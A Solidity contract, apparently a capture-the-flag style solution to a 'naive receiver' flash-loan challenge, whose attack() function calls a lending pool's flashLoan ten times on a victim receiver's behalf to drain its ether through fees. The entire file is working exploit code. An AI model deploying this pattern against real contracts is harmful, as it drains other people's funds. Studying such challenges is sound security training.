// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {
    address receiver;
    address payable pool;

    constructor(address _flashLoanReceiverAddress, address payable _naiveReceiverLenderPoolAddress) {
        receiver = _flashLoanReceiverAddress;
        pool = _naiveReceiverLenderPoolAddress;
    }

    function attack() public {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(address(receiver), 10 ether);
        }
    }
}